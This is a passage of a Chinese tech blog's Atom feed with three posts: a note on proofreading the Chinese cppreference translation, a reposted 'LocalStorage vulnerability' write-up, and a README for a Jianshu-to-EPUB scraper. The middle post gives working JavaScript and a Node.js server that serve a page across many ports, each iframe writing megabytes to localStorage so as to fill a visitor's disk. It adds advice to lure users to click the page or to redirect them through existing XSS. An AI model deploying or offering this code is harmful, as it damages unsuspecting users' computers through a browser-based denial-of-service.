      <category term="公告" scheme="http://www.flygon.net/categories/%E5%85%AC%E5%91%8A/"/>
    
    
  </entry>
  
  <entry>
    <title>C++参考的翻译或校对</title>
    <link href="http://www.flygon.net/Cpp%E5%8F%82%E8%80%83%E7%9A%84%E7%BF%BB%E8%AF%91%E6%88%96%E6%A0%A1%E5%AF%B9/"/>
    <id>http://www.flygon.net/Cpp参考的翻译或校对/</id>
    <published>2016-02-07T22:03:41.000Z</published>
    <updated>2018-10-29T08:27:03.144Z</updated>
    
    <content type="html"><![CDATA[<p>做新年规划的时候，我说过要翻译C++常用类的参考。C++的参考，其实别人已经翻译完了，只是部分内容需要校对。由于网站结构中大量使用了模板，同一个函数只需要翻译一个地方，所以四天就弄完了。而且我没有翻译函数层级的页面，所以比较快。</p><p>C++的参考其实最需要翻译。因为C++为了填C继承过来的坑，标准库增加了很多用于替代的设施。而国内的教程更新缓慢，这份参考如果不翻译，我估计到了2020年也不会完全普及。</p><p>以下是校对完成的类，希望大家继续参与：<a id="more"></a></p><ul><li><a href="http://zh.cppreference.com/w/cpp/memory" target="_blank" rel="noopener"><code>&lt;memory&gt;</code></a><ul><li><a href="http://zh.cppreference.com/w/cpp/memory/unique_ptr" target="_blank" rel="noopener"><code>unique_ptr</code></a></li><li><a href="http://zh.cppreference.com/w/cpp/memory/shared_ptr" target="_blank" rel="noopener"><code>shared_ptr</code></a></li><li><a href="http://zh.cppreference.com/w/cpp/memory/weak_ptr" target="_blank" rel="noopener"><code>weak_ptr</code></a></li></ul></li><li><a href="http://zh.cppreference.com/w/cpp/chrono" target="_blank" rel="noopener"><code>&lt;chrono&gt;</code></a><ul><li><a href="http://zh.cppreference.com/w/cpp/chrono/duration" target="_blank" rel="noopener"><code>duration</code></a></li></ul></li><li><a href="http://zh.cppreference.com/w/cpp/utility/functional" target="_blank" rel="noopener"><code>&lt;functional&gt;</code></a><ul><li><a href="http://zh.cppreference.com/w/cpp/utility/functional/function" target="_blank" rel="noopener"><code>function</code></a></li></ul></li><li><code>&lt;utility&gt;</code><ul><li><a href="http://zh.cppreference.com/w/cpp/utility/pair" target="_blank" rel="noopener"><code>pair</code></a></li><li><a href="http://zh.cppreference.com/w/cpp/utility/tuple" target="_blank" rel="noopener"><code>tuple</code></a></li></ul></li><li>字符串<ul><li><a href="http://zh.cppreference.com/w/cpp/string/basic_string" target="_blank" rel="noopener"><code>basic_string</code></a></li><li><a href="http://zh.cppreference.com/w/cpp/string/byte" target="_blank" rel="noopener">Null结尾的单字节字符串</a></li><li><a href="http://zh.cppreference.com/w/cpp/string/multibyte" target="_blank" rel="noopener">Null结尾的多字节字符串</a></li><li><a href="http://zh.cppreference.com/w/cpp/string/wide" target="_blank" rel="noopener">Null结尾的宽字符串</a></li></ul></li><li>容器<ul><li><a href="http://zh.cppreference.com/w/cpp/container/array" target="_blank" rel="noopener"><code>array</code></a></li><li><a href="http://zh.cppreference.com/w/cpp/container/vector" target="_blank" rel="noopener"><code>vector</code></a></li><li><a href="http://zh.cppreference.com/w/cpp/container/deque" target="_blank" rel="noopener"><code>deque</code></a></li><li><a href="http://zh.cppreference.com/w/cpp/container/list" target="_blank" rel="noopener"><code>list</code></a></li><li><a href="http://zh.cppreference.com/w/cpp/container/forward_list" target="_blank" rel="noopener"><code>forward_list</code></a></li><li><a href="http://zh.cppreference.com/w/cpp/container/set" target="_blank" rel="noopener"><code>set</code></a></li><li><a href="http://zh.cppreference.com/w/cpp/container/multiset" target="_blank" rel="noopener"><code>multiset</code></a></li><li><a href="http://zh.cppreference.com/w/cpp/container/map" target="_blank" rel="noopener"><code>map</code></a></li><li><a href="http://zh.cppreference.com/w/cpp/container/multimap" target="_blank" rel="noopener"><code>multimap</code></a></li><li><a href="http://zh.cppreference.com/w/cpp/container/unordered_set" target="_blank" rel="noopener"><code>unordered_set</code></a></li><li><a href="http://zh.cppreference.com/w/cpp/container/unordered_multiset" target="_blank" rel="noopener"><code>unordered_multiset</code></a></li><li><a href="http://zh.cppreference.com/w/cpp/container/unordered_map" target="_blank" rel="noopener"><code>unordered_map</code></a></li><li><a href="http://zh.cppreference.com/w/cpp/container/unordered_multimap" target="_blank" rel="noopener"><code>unordered_multimap</code></a></li><li><a href="http://zh.cppreference.com/w/cpp/container/stack" target="_blank" rel="noopener"><code>stack</code></a></li><li><a href="http://zh.cppreference.com/w/cpp/container/queue" target="_blank" rel="noopener"><code>queue</code></a></li><li><a href="http://zh.cppreference.com/w/cpp/container/priority_queue" target="_blank" rel="noopener"><code>priority_queue</code></a></li><li><a href="http://zh.cppreference.com/w/cpp/utility/bitset" target="_blank" rel="noopener"><code>bitset</code></a></li></ul></li><li>I/O<ul><li><a href="http://zh.cppreference.com/w/cpp/io/ios_base" target="_blank" rel="noopener"><code>ios_base</code></a></li><li><a href="http://zh.cppreference.com/w/cpp/io/basic_ios" target="_blank" rel="noopener"><code>basic_ios</code></a></li><li><a href="http://zh.cppreference.com/w/cpp/io/basic_istream" target="_blank" rel="noopener"><code>basic_istream</code></a></li><li><a href="http://zh.cppreference.com/w/cpp/io/basic_ostream" target="_blank" rel="noopener"><code>basic_ostream</code></a></li><li><a href="http://zh.cppreference.com/w/cpp/io/basic_iostream" target="_blank" rel="noopener"><code>basic_iostream</code></a></li><li><a href="http://zh.cppreference.com/w/cpp/io/basic_ifstream" target="_blank" rel="noopener"><code>basic_ifstream</code></a></li><li><a href="http://zh.cppreference.com/w/cpp/io/basic_ofstream" target="_blank" rel="noopener"><code>basic_ofstream</code></a></li><li><a href="http://zh.cppreference.com/w/cpp/io/basic_fstream" target="_blank" rel="noopener"><code>basic_fstream</code></a></li><li><a href="http://zh.cppreference.com/w/cpp/io/basic_istringstream" target="_blank" rel="noopener"><code>basic_istringstream</code></a></li><li><a href="http://zh.cppreference.com/w/cpp/io/basic_ostringstream" target="_blank" rel="noopener"><code>basic_ostringstream</code></a></li><li><a href="http://zh.cppreference.com/w/cpp/io/basic_stringstream" target="_blank" rel="noopener"><code>basic_stringstream</code></a></li></ul></li><li><a href="http://zh.cppreference.com/w/cpp/regex" target="_blank" rel="noopener"><code>&lt;regex&gt;</code></a><ul><li><a href="http://zh.cppreference.com/w/cpp/regex/basic_regex" target="_blank" rel="noopener"><code>basic_regex</code></a></li><li><a href="http://zh.cppreference.com/w/cpp/regex/match_results" target="_blank" rel="noopener"><code>match_results</code></a></li></ul></li><li><a href="http://zh.cppreference.com/w/cpp/atomic" target="_blank" rel="noopener"><code>&lt;atomic&gt;</code></a></li><li><a href="http://zh.cppreference.com/w/cpp/numeric" target="_blank" rel="noopener">数值库</a><ul><li><a href="http://zh.cppreference.com/w/cpp/numeric/ratio/ratio" target="_blank" rel="noopener"><code>ratio</code></a></li><li><a href="http://zh.cppreference.com/w/cpp/numeric/math" target="_blank" rel="noopener"><code>&lt;cmath&gt;</code></a></li><li><a href="http://zh.cppreference.com/w/cpp/numeric/complex" target="_blank" rel="noopener"><code>complex</code></a></li><li><a href="http://zh.cppreference.com/w/cpp/numeric/valarray" target="_blank" rel="noopener"><code>valarray</code></a></li></ul></li><li><a href="http://zh.cppreference.com/w/cpp/iterator" target="_blank" rel="noopener">迭代器库</a></li><li><a href="http://zh.cppreference.com/w/cpp/algorithm" target="_blank" rel="noopener">算法库</a></li></ul><p><a href="http://zh.cppreference.com/w/Special:%E7%94%A8%E6%88%B7%E8%B4%A1%E7%8C%AE/Wizardforcel" target="_blank" rel="noopener">我的贡献列表</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;做新年规划的时候，我说过要翻译C++常用类的参考。C++的参考，其实别人已经翻译完了，只是部分内容需要校对。由于网站结构中大量使用了模板，同一个函数只需要翻译一个地方，所以四天就弄完了。而且我没有翻译函数层级的页面，所以比较快。&lt;/p&gt;
&lt;p&gt;C++的参考其实最需要翻译。因为C++为了填C继承过来的坑，标准库增加了很多用于替代的设施。而国内的教程更新缓慢，这份参考如果不翻译，我估计到了2020年也不会完全普及。&lt;/p&gt;
&lt;p&gt;以下是校对完成的类，希望大家继续参与：
    
    </summary>
    
      <category term="编程" scheme="http://www.flygon.net/categories/%E7%BC%96%E7%A8%8B/"/>
    
    
      <category term="cpp" scheme="http://www.flygon.net/tags/cpp/"/>
    
  </entry>
  
  <entry>
    <title>LocalStorage 的一个漏洞</title>
    <link href="http://www.flygon.net/LocalStorage-%E7%9A%84%E4%B8%80%E4%B8%AA%E6%BC%8F%E6%B4%9E/"/>
    <id>http://www.flygon.net/LocalStorage-的一个漏洞/</id>
    <published>2016-02-07T21:12:04.000Z</published>
    <updated>2018-10-29T08:27:03.144Z</updated>
    
    <content type="html"><![CDATA[<p>LocalStorage 是 html5 的本地存储，其中的内容以文件的形式保存在本地磁盘中。</p><p>一个域（协议+域名+端口）的文件大小PC端为5~10M，移动端不大于2.5M。</p><p>但是我们可以在端口上做点手脚，因为端口是可控的，我们可以开一个服务器监听很多个端口，然后输出的页面使用iframe进行递归包含。</p><p>比如我们的页面可以嵌入以下代码：<a id="more"></a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">(function()&#123;</span><br><span class="line">    var maxPort = ...;</span><br><span class="line"></span><br><span class="line">    // 写文件</span><br><span class="line">    var s = &quot;&quot;;</span><br><span class="line">    for(var i=0; i&lt; 3 * 1024 * 1024; i++)&#123;</span><br><span class="line">        s += &quot;0&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    localStorage.setItem(&apos;k&apos;, s);</span><br><span class="line"></span><br><span class="line">    var port = parseInt(location.port) + 1;</span><br><span class="line">    if(port &gt; maxPort) return;</span><br><span class="line"></span><br><span class="line">    if(port % 50 == 0)&#123;</span><br><span class="line">        //每50个重定向一次，防止崩溃</span><br><span class="line">        window.location.href = url;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        // 新添加iframe</span><br><span class="line">        var url = &quot;http://example.com:&quot; + port;</span><br><span class="line">        var $iframe = document.createElement(&quot;iframe&quot;);</span><br><span class="line">        $iframe.src = url;</span><br><span class="line">        document.getElementsByTagName(&quot;body&quot;)[0].appendChild($iframe);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure><p>之后我们用Node.js架设服务器：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">var http = require(&apos;http&apos;);</span><br><span class="line">var fs = require(&apos;fs&apos;);</span><br><span class="line"></span><br><span class="line">var content = fs.readFileSync(&apos;./index.html&apos;);</span><br><span class="line"></span><br><span class="line">var maxPort = ...;</span><br><span class="line"></span><br><span class="line">for(var port = 1000; port &lt; maxPort; port++)&#123;</span><br><span class="line">    http.createServer(function (request, response) &#123;</span><br><span class="line">        response.writeHead(200, &#123; &apos;Content-Type&apos; : &apos;text/html; charset=UTF-8&apos; &#125;);</span><br><span class="line">        response.write(content);</span><br><span class="line">        response.end();</span><br><span class="line">    &#125;).listen(port);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们可以给页面加点装饰，诱导用户点击。也可以使用现有的XSS漏洞重定向过去。</p><p>测试结果</p><p>100个端口有几乎500MB</p><p><img src="http://litten.github.io/assets/blogImg/localstorage3.png" alt=""></p><p>200个端口则有1.17个G</p><p><img src="http://litten.github.io/assets/blogImg/localstorage4.png" alt=""></p><p>如果将端口调整至2000个</p><p><img src="http://litten.github.io/assets/blogImg/localstorage5.png" alt=""></p><p>GG。</p><p>注</p><p>来源：<a href="http://litten.github.io/2015/07/06/hack-in-localstorage/" target="_blank" rel="noopener">作为一个前端，可以如何机智地弄坏一台电脑？</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;LocalStorage 是 html5 的本地存储，其中的内容以文件的形式保存在本地磁盘中。&lt;/p&gt;
&lt;p&gt;一个域（协议+域名+端口）的文件大小PC端为5~10M，移动端不大于2.5M。&lt;/p&gt;
&lt;p&gt;但是我们可以在端口上做点手脚，因为端口是可控的，我们可以开一个服务器监听很多个端口，然后输出的页面使用iframe进行递归包含。&lt;/p&gt;
&lt;p&gt;比如我们的页面可以嵌入以下代码：
    
    </summary>
    
      <category term="安全" scheme="http://www.flygon.net/categories/%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="html5" scheme="http://www.flygon.net/tags/html5/"/>
    
  </entry>
  
  <entry>
    <title>【好东西】简书助手</title>
    <link href="http://www.flygon.net/%E5%A5%BD%E4%B8%9C%E8%A5%BF-%E7%AE%80%E4%B9%A6%E5%8A%A9%E6%89%8B/"/>
    <id>http://www.flygon.net/好东西-简书助手/</id>
    <published>2016-01-27T19:39:47.000Z</published>
    <updated>2018-10-29T08:27:03.148Z</updated>
    
    <content type="html"><![CDATA[<p>爬取简书的文章，并生成EPUB格式。</p><h2 id="用法"><a href="#用法" class="headerlink" title="用法"></a>用法</h2><p>首先到官网下载并安装node.js。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/wizardforcel/jianhelper.git</span><br><span class="line">cd jianhelper</span><br><span class="line">npm install</span><br><span class="line">node jianhelper url [start [end]]</span><br></pre></td></tr></table></figure><a id="more"></a><p>url：支持三种类型</p><ul><li><a href="http://www.jianshu.com/users/{id}" target="_blank" rel="noopener">http://www.jianshu.com/users/{id}</a> 用户</li><li><a href="http://www.jianshu.com/notebooks/{id}" target="_blank" rel="noopener">http://www.jianshu.com/notebooks/{id}</a> 文集</li><li><a href="http://www.jianshu.com/collection/{id}" target="_blank" rel="noopener">http://www.jianshu.com/collection/{id}</a> 专题</li></ul><p>start：起始页，默认为第一页</p><p>end：终止页，默认为最后一页</p><h2 id="TODO"><a href="#TODO" class="headerlink" title="TODO"></a>TODO</h2><ul><li>添加标题、封面</li></ul><h2 id="协议"><a href="#协议" class="headerlink" title="协议"></a>协议</h2><p>MIT-LICENSE</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;爬取简书的文章，并生成EPUB格式。&lt;/p&gt;
&lt;h2 id=&quot;用法&quot;&gt;&lt;a href=&quot;#用法&quot; class=&quot;headerlink&quot; title=&quot;用法&quot;&gt;&lt;/a&gt;用法&lt;/h2&gt;&lt;p&gt;首先到官网下载并安装node.js。&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;git clone https://github.com/wizardforcel/jianhelper.git&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;cd jianhelper&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;npm install&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;node jianhelper url [start [end]]&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
    
    </summary>
    
      <category term="应用" scheme="http://www.flygon.net/categories/%E5%BA%94%E7%94%A8/"/>
    
    
  </entry>
  
</feed>
